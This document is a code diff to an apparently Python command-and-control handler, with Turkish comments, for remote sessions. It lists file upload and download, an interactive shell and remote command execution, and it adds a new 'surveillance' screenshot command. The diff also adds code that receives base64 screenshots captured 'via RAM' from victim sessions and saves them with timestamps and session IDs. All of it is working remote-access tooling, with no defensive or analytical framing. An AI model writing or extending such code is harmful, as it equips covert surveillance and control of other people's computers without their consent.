@@ -13,6 +13,8 @@ import ssl
 import os
 import subprocess
 import base64
+import sys
+from datetime import datetime
 from rich import print
 from typing import Dict, Any, Tuple
 
@@ -281,6 +283,9 @@ class Handler(BaseHandler):
   upload <local> [remote] - Dosya yükle
   download <remote>     - Dosya indir
 
+[Gözetleme]
+  screenshot            - Anlık ekran görüntüsü al (RAM üzerinden)
+
 [Komut Çalıştırma]
   shell                 - İnteraktif shell başlat
   <komut>               - Sistem komutu çalıştır (örn: whoami, ipconfig)
@@ -397,6 +402,44 @@ class Handler(BaseHandler):
                             print(f"[+] Dosya başarıyla indirildi: {save_path} ({len(file_content)} bytes)")
                         except Exception as e:
                             print(f"[!] Download kaydetme hatası: {str(e)}")
+                    
+                    # Ekran Görüntüsü: Gelen screenshot verisini dosyaya kaydet
+                    elif response.startswith("SCREENSHOT_OK:"):
+                        try:
+                            b64_data = response.split(":", 1)[1]
+                            img_data = base64.b64decode(b64_data)
+                            
+                            # screenshots klasörünü oluştur
+                            screenshots_dir = os.path.join(os.getcwd(), "screenshots")
+                            os.makedirs(screenshots_dir, exist_ok=True)
+                            
+                            # Dosya formatını belirle (BMP veya PNG)
+                            if img_data[:2] == b'BM':
+                                ext = "bmp"
+                            else:
+                                ext = "png"
+                            
+                            # Timestamp ile dosya adı oluştur
+                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                            filename = f"screenshot_{timestamp}_session{self.session_id}.{ext}"
+                            save_path = os.path.join(screenshots_dir, filename)
+                            
+                            with open(save_path, "wb") as f:
+                                f.write(img_data)
+                            
+                            # Dosya boyutunu insan okunabilir formata çevir
+                            size_kb = len(img_data) / 1024
+                            if size_kb > 1024:
+                                size_str = f"{size_kb/1024:.2f} MB"
+                            else:
+                                size_str = f"{size_kb:.2f} KB"
+                            
+                            print(f"[+] 📸 Ekran görüntüsü kaydedildi!")
+                            print(f"    Dosya : {save_path}")
+                            print(f"    Boyut : {size_str}")
+                            print(f"    Format: {ext.upper()}")
+                        except Exception as e:
+                            print(f"[!] Screenshot kaydetme hatası: {str(e)}")
                     else:
                         print(response)
                 else:
